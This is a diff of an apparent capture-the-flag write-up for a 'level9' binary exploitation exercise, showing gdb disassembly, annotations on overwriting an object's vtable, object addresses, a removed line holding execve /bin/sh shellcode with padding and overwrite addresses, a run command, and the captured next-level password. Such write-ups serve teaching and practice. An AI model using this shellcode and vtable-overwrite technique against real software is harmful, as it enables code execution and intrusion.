@@ -718,7 +718,7 @@ Non-debugging symbols:
 0x0804870e  N::setAnnotation(char*)
 0x0804873a  N::operator+(N&)
 0x0804874e  N::operator-(N&)
-gdb) disas main
+(gdb) disas main
 Dump of assembler code for function main:
    0x080485f4 <+0>:     push   ebp
    0x080485f5 <+1>:     mov    ebp,esp
@@ -744,9 +744,9 @@ Dump of assembler code for function main:
    0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>
    0x08048650 <+92>:    mov    DWORD PTR [esp+0x18],ebx
    0x08048654 <+96>:    mov    eax,DWORD PTR [esp+0x1c]
-   0x08048658 <+100>:   mov    DWORD PTR [esp+0x14],eax
+   0x08048658 <+100>:   mov    DWORD PTR [esp+0x14],eax    esp+0x14 = a
    0x0804865c <+104>:   mov    eax,DWORD PTR [esp+0x18]
-   0x08048660 <+108>:   mov    DWORD PTR [esp+0x10],eax
+   0x08048660 <+108>:   mov    DWORD PTR [esp+0x10],eax    esp+0x10 = b
    0x08048664 <+112>:   mov    eax,DWORD PTR [ebp+0xc]
    0x08048667 <+115>:   add    eax,0x4
    0x0804866a <+118>:   mov    eax,DWORD PTR [eax]
@@ -766,30 +766,18 @@ Dump of assembler code for function main:
    0x08048698 <+164>:   leave  
    0x08048699 <+165>:   ret    
 End of assembler dump.
-(gdb) disas 0x0804870e
-Dump of assembler code for function _ZN1N13setAnnotationEPc:
-   0x0804870e <+0>:     push   ebp
-   0x0804870f <+1>:     mov    ebp,esp
-   0x08048711 <+3>:     sub    esp,0x18
-   0x08048714 <+6>:     mov    eax,DWORD PTR [ebp+0xc]
-   0x08048717 <+9>:     mov    DWORD PTR [esp],eax
-   0x0804871a <+12>:    call   0x8048520 <strlen@plt>
-   0x0804871f <+17>:    mov    edx,DWORD PTR [ebp+0x8]
-   0x08048722 <+20>:    add    edx,0x4
-   0x08048725 <+23>:    mov    DWORD PTR [esp+0x8],eax
-   0x08048729 <+27>:    mov    eax,DWORD PTR [ebp+0xc]
-   0x0804872c <+30>:    mov    DWORD PTR [esp+0x4],eax
-   0x08048730 <+34>:    mov    DWORD PTR [esp],edx
-   0x08048733 <+37>:    call   0x8048510 <memcpy@plt>
-   0x08048738 <+42>:    leave  
-   0x08048739 <+43>:    ret    
-End of assembler dump.
 (gdb) x/wx $esp+0x1c
 0xbffff72c:     0x0804a008
 (gdb) x/wx $esp+0x18 
 0xbffff728:     0x08048779
 ```
 
+We override the first entry of a's vtable.
+
+(gdb) p/x *(void **)( $esp + 0x14 )
+$1 = 0x804a008
+(gdb) p/x *(void **)( $esp + 0x10 )
+$2 = 0x804a078
 
 a = 0x0804a008
 a->_annotation = 0x0804a00c
@@ -798,6 +786,9 @@ b = 0x08048779
 b->_annotation = 0x0804877d
 N::operator+ = 0x0804873a
 
-b'1\xc0P\x04\x0bh//shh/bin\x89\xe31\xc91\xd2\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0c\xa0\x04\x08t\xa0\x04\x08\n'
-
 `./level9.sh | tr -d '\n' | python -c 'print(open(0, "rb").read())' ; python level9.py`
+
+```console
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
